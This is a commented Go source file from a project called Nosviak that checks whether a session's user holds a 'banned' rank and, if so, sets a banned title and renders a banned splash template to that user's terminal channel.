package views

import (
	"Nosviak/core/masters/sessions"
	"Nosviak/core/masters/users/ranks"
	"Nosviak/core/models/views"
)

//checks & renders the banned information
//this will check if the user is banned & render the banned splash when he has been
func BannedUser(session *sessions.Session) (bool, error) {

	//gets the ranks the user maintains
	//this will allow us to check if he has the banned rank
	rank, err := ranks.UnravelRanks(session.User)

	//err handles the rank array statement
	//that will take the rank string and convert it into an array
	if err != nil {
		//returns an error which happened during the process
		return false, err
	}

	//checks if the user has access to the banned rank
	//this confirms the user has been banned which we will display the banned information
	if !ranks.CanAccess("banned", rank) {
		//returns false as the user isn't banned and can access the system
		return false, nil
	}

	//makes sure the users session is still open
	//this fixes some crashes which can be caused due to this error
	if sessions.Sessions[session.Connected.Unix()] == nil {
		//we will return true at this point to kill the instance for the user
		return true, nil
	}

	//sets the sessions title to the title which is for banned
	//this will allow the user to view the banned title
	sessions.Sessions[session.Connected.Unix()].Title = "banned-title.dtx"

	//renders the banned splash correctly
	//this will display to the user that he is banned correctly
	return true, views.NewDTX("banned-splash.dtx", session.Write).Template(session, session.Channel)
}